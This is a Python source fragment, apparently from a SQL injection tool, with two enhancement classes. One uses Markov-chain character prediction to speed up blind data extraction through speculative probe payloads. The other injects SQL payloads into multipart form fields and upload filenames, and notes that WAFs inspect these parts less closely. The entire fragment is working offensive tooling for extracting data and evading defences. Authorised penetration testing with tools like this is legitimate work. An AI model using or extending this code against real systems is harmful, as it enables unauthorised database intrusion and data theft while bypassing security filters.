#  Enhancement 12: Markov Chain Predictive Extraction 

class MarkovPredictiveExtractor:
    """
    Uses Markov chain character prediction to speed up blind extraction.

    After extracting partial strings, predicts the most likely next characters
    based on DBMS-specific patterns (version strings, identifiers, keywords).

    Reduces probes by 40-60% for predictable strings like version numbers,
    table names, and SQL keywords.
    """

    # Bigram transition probabilities for common patterns
    BIGRAMS: Dict[str, Dict[str, float]] = {
        "My": {"S": 0.9, "s": 0.05},
        "MS": {"Q": 0.8, "S": 0.1},
        "SQ": {"L": 0.95},
        "Po": {"s": 0.9},
        "st": {"g": 0.3, "r": 0.3, "a": 0.2},
        "gr": {"e": 0.8},
        "re": {"s": 0.3, "d": 0.2, "a": 0.2},
        "Or": {"a": 0.9},
        "ra": {"c": 0.4, "n": 0.3},
        "Li": {"t": 0.5, "n": 0.3},
        "te": {"r": 0.3, "s": 0.2, "d": 0.1},
        "in": {"": 0.2, "g": 0.15, "t": 0.15, "s": 0.1},
        "fo": {"r": 0.6},
        "rm": {"a": 0.8},
        "at": {"i": 0.4, "e": 0.3},
        "io": {"n": 0.9},
        "on": {"_": 0.3, "s": 0.2},
        "sc": {"h": 0.5, "r": 0.2},
        "he": {"m": 0.3, "a": 0.2},
        "ma": {"s": 0.3, "t": 0.2},
        "8.": {"0": 0.7, "1": 0.1, "2": 0.1, "3": 0.05, "4": 0.05},
        "5.": {"7": 0.4, "6": 0.2, "5": 0.2},
        "1.": {"0": 0.3, "1": 0.2, "2": 0.2, "3": 0.1, "4": 0.1, "5": 0.1},
    }

    @classmethod
    def predict_next(cls, context: str, top_n: int = 3) -> List[Tuple[str, float]]:
        """Predict next character from last 2 chars of context."""
        if len(context) < 2:
            return []
        bigram = context[-2:]
        probs = cls.BIGRAMS.get(bigram, {})
        if not probs:
            return []
        sorted_probs = sorted(probs.items(), key=lambda x: -x[1])
        return sorted_probs[:top_n]

    @classmethod
    def speculative_probes(cls, context: str, char_func_expr: str,
                            build_payload_fn) -> List[Tuple[str, str]]:
        """Generate speculative probe payloads for predicted characters."""
        predictions = cls.predict_next(context)
        probes = []
        for char, prob in predictions:
            if prob >= 0.2:  # Only probe if probability >= 20%
                cond = f"{char_func_expr}={ord(char)}"
                probes.append((char, build_payload_fn(cond)))
        return probes


#  Enhancement 13: Multipart Form Injection 

class MultipartInjector:
    """
    Injects SQL payloads into multipart/form-data requests.

    Many file upload endpoints accept multipart bodies with text fields.
    WAFs often don't inspect individual multipart parts as thoroughly
    as query parameters or form-encoded bodies.

    Injection surfaces:
      - Text form field values
      - Filename parameter in Content-Disposition
      - Content-Type of individual parts
    """

    @staticmethod
    def build_multipart_body(fields: Dict[str, str],
                              inject_param: str = "",
                              inject_value: str = "") -> Tuple[str, str]:
        """Build multipart/form-data body with injected payload."""
        boundary = f"----WebKitFormBoundary{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"

        parts = []
        for name, value in fields.items():
            if name == inject_param and inject_value:
                value = inject_value
            parts.append(
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
                f"{value}\r\n"
            )
        parts.append(f"--{boundary}--\r\n")

        body = "".join(parts)
        content_type = f"multipart/form-data; boundary={boundary}"
        return body, content_type

    @staticmethod
    def build_filename_injection(filename_payload: str,
                                  field_name: str = "file") -> Tuple[str, str]:
        """Inject SQL into the filename of a file upload."""
        boundary = f"----WebKitFormBoundary{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"

        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{field_name}"; '
            f'filename="{filename_payload}"\r\n'
            "Content-Type: application/octet-stream\r\n\r\n"
            "filedata\r\n"
            f"--{boundary}--\r\n"
        )
        content_type = f"multipart/form-data; boundary={boundary}"
        return body, content_type


